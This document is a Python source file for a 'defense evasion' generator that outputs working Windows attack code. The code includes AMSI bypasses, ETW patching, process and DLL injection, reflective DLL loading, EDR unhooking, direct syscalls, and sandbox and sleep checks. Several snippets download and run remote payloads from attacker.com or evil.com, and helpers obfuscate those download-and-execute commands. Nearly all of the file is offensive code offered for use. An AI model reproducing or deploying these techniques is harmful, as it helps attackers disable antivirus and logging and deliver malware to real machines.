"""
Defense Evasion Module
Techniques for bypassing antivirus, EDR, AMSI, ETW, and other security controls.
"""

import asyncio
import json
import base64
import zlib
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Literal
from enum import Enum


class EvasionTechnique(str, Enum):
    """Defense evasion techniques"""
    AMSI_BYPASS = "amsi_bypass"
    ETW_PATCHING = "etw_patching"
    PROCESS_INJECTION = "process_injection"
    DLL_INJECTION = "dll_injection"
    PROCESS_HOLLOWING = "process_hollowing"
    REFLECTIVE_DLL = "reflective_dll"
    OBFUSCATION = "obfuscation"
    SANDBOX_DETECTION = "sandbox_detection"
    VM_DETECTION = "vm_detection"
    SLEEP_EVASION = "sleep_evasion"
    UNHOOKING = "unhooking"
    DIRECT_SYSCALL = "direct_syscall"


@dataclass
class EvasionPayload:
    """Evasion technique payload"""
    technique: EvasionTechnique
    platform: str  # windows, linux
    code: str
    language: str  # powershell, csharp, python, c
    description: str
    success_rate: int  # 0-100
    detection_rate: str  # low, medium, high
    requires_admin: bool = False
    mitre_technique: Optional[str] = None
    
    def to_dict(self) -> Dict:
        return {
            "technique": self.technique.value,
            "platform": self.platform,
            "code": self.code,
            "language": self.language,
            "description": self.description,
            "success_rate": self.success_rate,
            "detection_rate": self.detection_rate,
            "requires_admin": self.requires_admin,
            "mitre_technique": self.mitre_technique
        }


class DefenseEvasionGenerator:
    """Generator for defense evasion techniques"""
    
    def __init__(self):
        pass
    
    async def generate_amsi_bypass(self, variant: int = 1) -> EvasionPayload:
        """Generate AMSI bypass techniques"""
        
        if variant == 1:
            # Classic AMSI bypass - memory patching
            code = """# AMSI Bypass - Memory Patching
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("amsi.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "AmsiScanBuffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)"""
        
        elif variant == 2:
            # Obfuscated AMSI bypass
            code = """# AMSI Bypass - Obfuscated
$a = 'si'
$b = 'Am'
$c = 'Utils'
$d = ".$b$a$c".ToCharArray()
[Array]::Reverse($d)
-join $d
$e = [Ref].Assembly.GetType('System.Management.Automation.'+(-join $d))
$f = $e.GetField('amsiInitFailed','NonPublic,Static')
$f.SetValue($null,$true)"""
        
        elif variant == 3:
            # Reflection-based AMSI bypass
            code = """# AMSI Bypass - Reflection
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"""
        
        else:
            # Matt Graeber's classic
            code = """# AMSI Bypass - Matt Graeber's Classic
[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)"""
        
        return EvasionPayload(
            technique=EvasionTechnique.AMSI_BYPASS,
            platform="windows",
            code=code,
            language="powershell",
            description=f"AMSI bypass variant {variant} - disables Windows Antimalware Scan Interface",
            success_rate=85,
            detection_rate="medium",
            requires_admin=False,
            mitre_technique="T1562.001"
        )
    
    async def generate_etw_patch(self) -> EvasionPayload:
        """Generate ETW patching code"""
        
        code = """# ETW Bypass - Patch Event Tracing for Windows
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Win32

# Patch EtwEventWrite
$ntdll = [Win32]::LoadLibrary("ntdll.dll")
$etwAddr = [Win32]::GetProcAddress($ntdll, "EtwEventWrite")
$oldProtect = 0
[Win32]::VirtualProtect($etwAddr, [uint32]5, 0x40, [ref]$oldProtect)
$patch = [byte[]](0xc3)  # ret instruction
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $etwAddr, 1)
[Win32]::VirtualProtect($etwAddr, [uint32]5, $oldProtect, [ref]$oldProtect)

Write-Host "[+] ETW patched successfully"
"""
        
        return EvasionPayload(
            technique=EvasionTechnique.ETW_PATCHING,
            platform="windows",
            code=code,
            language="powershell",
            description="ETW patching - disables Event Tracing for Windows to evade logging",
            success_rate=80,
            detection_rate="high",
            requires_admin=False,
            mitre_technique="T1562.001"
        )
    
    async def generate_process_injection(self, method: Literal["classic", "apc", "process_doppelganging"] = "classic") -> EvasionPayload:
        """Generate process injection code"""
        
        if method == "classic":
            code = """// Classic Process Injection - C#
using System;
using System.Runtime.InteropServices;

public class ProcessInjection {
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
    
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    
    public static void InjectShellcode(int pid, byte[] shellcode) {
        IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
        UIntPtr outSize;
        WriteProcessMemory(hProcess, addr, shellcode, (uint)shellcode.Length, out outSize);
        CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
    }
}

// Usage:
// byte[] shellcode = new byte[] { 0x90, 0x90, ... };
// ProcessInjection.InjectShellcode(1234, shellcode);"""
        
        elif method == "apc":
            code = """// APC Queue Injection - C#
using System;
using System.Runtime.InteropServices;

public class APCInjection {
    [DllImport("kernel32.dll")]
    static extern IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
    
    [DllImport("kernel32.dll")]
    static extern uint QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
    
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    public static void InjectViaAPC(uint threadId, IntPtr hProcess, byte[] shellcode) {
        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
        // WriteProcessMemory to addr
        IntPtr hThread = OpenThread(0x0010, false, threadId);
        QueueUserAPC(addr, hThread, IntPtr.Zero);
    }
}"""
        
        else:  # process_doppelganging
            code = """// Process Doppelganging - Advanced technique
// This technique uses NTFS transactions to create a "phantom" process
// Steps:
// 1. Create a file transaction
// 2. Write malicious code to transacted file
// 3. Create a process section from the transacted file
// 4. Rollback the transaction (file never touches disk)
// 5. Create a process from the section

// Implementation requires ntdll.dll functions:
// NtCreateTransaction, NtCreateSection, NtCreateProcessEx, NtCreateThreadEx"""
        
        return EvasionPayload(
            technique=EvasionTechnique.PROCESS_INJECTION,
            platform="windows",
            code=code,
            language="csharp",
            description=f"Process injection via {method} - inject shellcode into remote process",
            success_rate=75,
            detection_rate="high" if method == "classic" else "medium",
            requires_admin=False,
            mitre_technique="T1055"
        )
    
    async def generate_dll_injection(self) -> EvasionPayload:
        """Generate DLL injection code"""
        
        code = """// DLL Injection - C#
using System;
using System.Runtime.InteropServices;
using System.Text;

public class DLLInjection {
    [DllImport("kernel32.dll")]
    static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    
    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    
    [DllImport("kernel32.dll")]
    static extern IntPtr GetModuleHandle(string lpModuleName);
    
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
    
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    
    public static void InjectDLL(int pid, string dllPath) {
        IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
        IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
        
        byte[] dllBytes = Encoding.ASCII.GetBytes(dllPath);
        IntPtr allocAddr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)dllBytes.Length, 0x3000, 0x40);
        
        UIntPtr bytesWritten;
        WriteProcessMemory(hProcess, allocAddr, dllBytes, (uint)dllBytes.Length, out bytesWritten);
        
        CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLibraryAddr, allocAddr, 0, IntPtr.Zero);
    }
}

// Usage:
// DLLInjection.InjectDLL(1234, "C:\\\\malicious.dll");"""
        
        return EvasionPayload(
            technique=EvasionTechnique.DLL_INJECTION,
            platform="windows",
            code=code,
            language="csharp",
            description="DLL injection - inject malicious DLL into remote process",
            success_rate=80,
            detection_rate="high",
            requires_admin=False,
            mitre_technique="T1055.001"
        )
    
    async def generate_reflective_dll(self) -> EvasionPayload:
        """Generate reflective DLL loading code"""
        
        code = """// Reflective DLL Injection - Load DLL from memory
// PowerShell example using Invoke-ReflectivePEInjection

# Download and load ReflectivePEInjection
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1')

# Load DLL from memory (no disk touch)
$PEBytes = [IO.File]::ReadAllBytes("C:\\malicious.dll")
Invoke-ReflectivePEInjection -PEBytes $PEBytes

# OR load directly from URL
$PEBytes = (New-Object Net.WebClient).DownloadData('http://attacker.com/payload.dll')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ForceASLR

# Inject into specific process
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ProcessID 1234

# C# implementation would use:
// 1. Parse PE headers
// 2. Allocate memory for sections
// 3. Copy sections to memory
// 4. Process relocations
// 5. Resolve imports
// 6. Call entry point"""
        
        return EvasionPayload(
            technique=EvasionTechnique.REFLECTIVE_DLL,
            platform="windows",
            code=code,
            language="powershell",
            description="Reflective DLL injection - load DLL from memory without touching disk",
            success_rate=85,
            detection_rate="medium",
            requires_admin=False,
            mitre_technique="T1055.001"
        )
    
    async def generate_obfuscation(self, payload: str, method: Literal["base64", "xor", "gzip", "caesar"] = "base64") -> EvasionPayload:
        """Generate obfuscated payload"""
        
        if method == "base64":
            encoded = base64.b64encode(payload.encode()).decode()
            code = f"""# Base64 Obfuscation
$encoded = "{encoded}"
$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded))
IEX $decoded

# OR with Python
import base64
payload = base64.b64decode("{encoded}").decode()
exec(payload)"""
        
        elif method == "xor":
            key = 0x41
            xored = ''.join(chr(ord(c) ^ key) for c in payload)
            xored_hex = ''.join(f'\\x{ord(c):02x}' for c in xored)
            code = f"""# XOR Obfuscation (Key: 0x{key:02x})
$encoded = "{xored_hex}"
$key = 0x{key:02x}
$decoded = -join ($encoded.ToCharArray() | ForEach-Object {{ [char]([byte]$_ -bxor $key) }})
IEX $decoded

# OR with Python
payload = bytes.fromhex("{xored_hex}")
key = {key}
decoded = ''.join(chr(b ^ key) for b in payload)
exec(decoded)"""
        
        elif method == "gzip":
            compressed = zlib.compress(payload.encode())
            encoded = base64.b64encode(compressed).decode()
            code = f"""# Gzip + Base64 Obfuscation
$encoded = "{encoded}"
$bytes = [System.Convert]::FromBase64String($encoded)
$ms = New-Object System.IO.MemoryStream(,$bytes)
$gz = New-Object System.IO.Compression.GzipStream($ms, [System.IO.Compression.CompressionMode]::Decompress)
$sr = New-Object System.IO.StreamReader($gz)
$decoded = $sr.ReadToEnd()
IEX $decoded

# OR with Python
import base64, gzip
payload = gzip.decompress(base64.b64decode("{encoded}")).decode()
exec(payload)"""
        
        else:  # caesar
            shift = 13
            encoded = ''.join(chr((ord(c) + shift) % 256) for c in payload)
            code = f"""# Caesar Cipher Obfuscation (Shift: {shift})
$encoded = "{encoded}"
$shift = {shift}
$decoded = -join ($encoded.ToCharArray() | ForEach-Object {{ [char](([byte]$_ - $shift + 256) % 256) }})
IEX $decoded"""
        
        return EvasionPayload(
            technique=EvasionTechnique.OBFUSCATION,
            platform="multi",
            code=code,
            language="multi",
            description=f"Payload obfuscation using {method} encoding",
            success_rate=70,
            detection_rate="low",
            requires_admin=False,
            mitre_technique="T1027"
        )
    
    async def generate_sandbox_detection(self) -> EvasionPayload:
        """Generate sandbox detection code"""
        
        code = """# Sandbox Detection
function Test-Sandbox {
    $indicators = 0
    
    # Check for common sandbox usernames
    $sandboxUsers = @('sandbox', 'malware', 'virus', 'sample')
    if ($sandboxUsers -contains $env:USERNAME.ToLower()) { $indicators++ }
    
    # Check for low RAM (sandboxes often have < 2GB)
    $ram = (Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB
    if ($ram -lt 2) { $indicators++ }
    
    # Check for low CPU count
    if ((Get-WmiObject Win32_ComputerSystem).NumberOfProcessors -lt 2) { $indicators++ }
    
    # Check for common sandbox processes
    $sandboxProcs = @('vboxservice', 'vboxtray', 'vmtoolsd', 'vmwaretray', 'vmwareuser')
    $running = Get-Process | Select-Object -ExpandProperty Name
    foreach ($proc in $sandboxProcs) {
        if ($running -contains $proc) { $indicators++ }
    }
    
    # Check for VM artifacts
    $vmCheck = Get-WmiObject Win32_ComputerSystem | Select-Object -ExpandProperty Model
    if ($vmCheck -match 'VirtualBox|VMware|Virtual|QEMU') { $indicators++ }
    
    # Check for debugger
    if ([System.Diagnostics.Debugger]::IsAttached) { $indicators++ }
    
    # Sleep to evade time-based sandboxes
    Start-Sleep -Seconds 60
    
    # If 3+ indicators, likely sandbox
    return ($indicators -ge 3)
}

if (Test-Sandbox) {
    Write-Host "Sandbox detected! Exiting..."
    exit
} else {
    # Execute payload
    IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')
}

# Python version
import os, time, psutil

def is_sandbox():
    indicators = 0
    
    # Check username
    if any(x in os.getenv('USER', '').lower() for x in ['sandbox', 'malware', 'virus']):
        indicators += 1
    
    # Check RAM
    if psutil.virtual_memory().total < 2 * 1024**3:
        indicators += 1
    
    # Check CPU count
    if psutil.cpu_count() < 2:
        indicators += 1
    
    # Sleep evasion
    time.sleep(60)
    
    return indicators >= 2

if not is_sandbox():
    # Execute payload
    pass"""
        
        return EvasionPayload(
            technique=EvasionTechnique.SANDBOX_DETECTION,
            platform="multi",
            code=code,
            language="multi",
            description="Sandbox detection - detect and evade automated analysis environments",
            success_rate=75,
            detection_rate="low",
            requires_admin=False,
            mitre_technique="T1497.001"
        )
    
    async def generate_sleep_evasion(self) -> EvasionPayload:
        """Generate sleep evasion code"""
        
        code = """# Sleep Evasion - Evade time-accelerated sandboxes
function Invoke-SleepEvasion {
    param([int]$Seconds = 60)
    
    # Method 1: Check time delta
    $start = Get-Date
    Start-Sleep -Seconds $Seconds
    $end = Get-Date
    $delta = ($end - $start).TotalSeconds
    
    # If delta is less than expected, sandbox detected
    if ($delta -lt ($Seconds * 0.9)) {
        Write-Host "Time acceleration detected! Exiting..."
        exit
    }
    
    # Method 2: CPU-bound sleep (can't be accelerated)
    $start = Get-Date
    $end = $start.AddSeconds($Seconds)
    while ((Get-Date) -lt $end) {
        $x = 0
        for ($i = 0; $i -lt 1000000; $i++) { $x++ }
    }
    
    # Method 3: Network-based sleep
    for ($i = 0; $i -lt $Seconds; $i++) {
        try {
            $null = Test-NetConnection -ComputerName "8.8.8.8" -Port 53 -InformationLevel Quiet
        } catch {}
    }
}

# Execute sleep evasion before payload
Invoke-SleepEvasion -Seconds 120

# If we reach here, not a sandbox
# Execute payload
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"""
        
        return EvasionPayload(
            technique=EvasionTechnique.SLEEP_EVASION,
            platform="windows",
            code=code,
            language="powershell",
            description="Sleep evasion - detect time-accelerated sandboxes",
            success_rate=80,
            detection_rate="low",
            requires_admin=False,
            mitre_technique="T1497.003"
        )
    
    async def generate_unhooking(self) -> EvasionPayload:
        """Generate API unhooking code"""
        
        code = """# API Unhooking - Remove EDR hooks from ntdll.dll
function Invoke-Unhook {
    # Load a fresh copy of ntdll from disk
    $ntdllPath = "C:\\Windows\\System32\\ntdll.dll"
    $ntdllBytes = [System.IO.File]::ReadAllBytes($ntdllPath)
    
    # Get current ntdll base address
    $ntdllBase = [System.Diagnostics.Process]::GetCurrentProcess().Modules | 
        Where-Object {$_.ModuleName -eq "ntdll.dll"} | 
        Select-Object -ExpandProperty BaseAddress
    
    # Parse PE headers to find .text section
    $dosHeader = [System.Runtime.InteropServices.Marshal]::ReadInt32($ntdllBase)
    $peHeader = [System.Runtime.InteropServices.Marshal]::ReadInt32($ntdllBase, $dosHeader + 0x3C)
    $textSectionRVA = [System.Runtime.InteropServices.Marshal]::ReadInt32($ntdllBase, $peHeader + 0x2C)
    $textSectionSize = [System.Runtime.InteropServices.Marshal]::ReadInt32($ntdllBase, $peHeader + 0x30)
    
    # Change memory protection to RWX
    $oldProtect = 0
    [Win32]::VirtualProtect($ntdllBase + $textSectionRVA, $textSectionSize, 0x40, [ref]$oldProtect)
    
    # Copy fresh .text section
    [System.Runtime.InteropServices.Marshal]::Copy($ntdllBytes, $textSectionRVA, $ntdllBase + $textSectionRVA, $textSectionSize)
    
    # Restore original protection
    [Win32]::VirtualProtect($ntdllBase + $textSectionRVA, $textSectionSize, $oldProtect, [ref]$oldProtect)
    
    Write-Host "[+] ntdll.dll hooks removed"
}

# Execute unhooking before payload
Invoke-Unhook

# Now EDR hooks are bypassed
# Execute malicious code"""
        
        return EvasionPayload(
            technique=EvasionTechnique.UNHOOKING,
            platform="windows",
            code=code,
            language="powershell",
            description="API unhooking - remove EDR hooks from ntdll.dll",
            success_rate=85,
            detection_rate="high",
            requires_admin=False,
            mitre_technique="T1562.001"
        )
    
    async def generate_direct_syscall(self) -> EvasionPayload:
        """Generate direct syscall code"""
        
        code = """// Direct Syscalls - Bypass EDR hooks by calling syscalls directly
// This requires assembly and cannot be easily done in pure C#/PowerShell

// Example: NtAllocateVirtualMemory direct syscall
// x64 Assembly:
mov r10, rcx
mov eax, 0x18    ; Syscall number for NtAllocateVirtualMemory
syscall
ret

// C implementation using inline assembly (MSVC)
NTSTATUS NtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
) {
    // Prepare syscall
    __asm {
        mov r10, rcx
        mov eax, 0x18
        syscall
        ret
    }
}

// Use SysWhispers2 to generate syscall stubs:
// git clone https://github.com/jthuraisamy/SysWhispers2
// python syswhispers.py -f NtAllocateVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx -o syscalls

// This generates:
// - syscalls.h
// - syscalls.c
// - syscalls.asm

// Include in your project and use like:
NtAllocateVirtualMemory(GetCurrentProcess(), &baseAddr, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);"""
        
        return EvasionPayload(
            technique=EvasionTechnique.DIRECT_SYSCALL,
            platform="windows",
            code=code,
            language="c",
            description="Direct syscalls - bypass EDR hooks by calling NT APIs directly",
            success_rate=90,
            detection_rate="very_high",
            requires_admin=False,
            mitre_technique="T1055"
        )
    
    async def generate_all_techniques(self, platform: Literal["windows", "linux", "multi"] = "windows") -> List[EvasionPayload]:
        """Generate all evasion techniques for a platform"""
        
        techniques = []
        
        if platform in ["windows", "multi"]:
            # Windows-specific
            techniques.append(await self.generate_amsi_bypass(variant=1))
            techniques.append(await self.generate_amsi_bypass(variant=2))
            techniques.append(await self.generate_etw_patch())
            techniques.append(await self.generate_process_injection("classic"))
            techniques.append(await self.generate_process_injection("apc"))
            techniques.append(await self.generate_dll_injection())
            techniques.append(await self.generate_reflective_dll())
            techniques.append(await self.generate_unhooking())
            techniques.append(await self.generate_direct_syscall())
            techniques.append(await self.generate_sleep_evasion())
        
        if platform in ["linux", "multi"]:
            # Linux-specific would go here
            pass
        
        # Multi-platform
        techniques.append(await self.generate_obfuscation("IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')", "base64"))
        techniques.append(await self.generate_obfuscation("IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')", "xor"))
        techniques.append(await self.generate_obfuscation("IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')", "gzip"))
        techniques.append(await self.generate_sandbox_detection())
        
        return techniques


async def main():
    """Example usage"""
    generator = DefenseEvasionGenerator()
    
    print("[*] Generating Windows evasion techniques...")
    windows_evasion = await generator.generate_all_techniques("windows")
    print(f"[+] Generated {len(windows_evasion)} evasion techniques")
    
    # Display AMSI bypass
    amsi = [t for t in windows_evasion if t.technique == EvasionTechnique.AMSI_BYPASS][0]
    print(f"\n[+] AMSI Bypass:")
    print(f"    Success Rate: {amsi.success_rate}%")
    print(f"    Detection Rate: {amsi.detection_rate}")
    print(f"    MITRE: {amsi.mitre_technique}")


if __name__ == "__main__":
    asyncio.run(main())
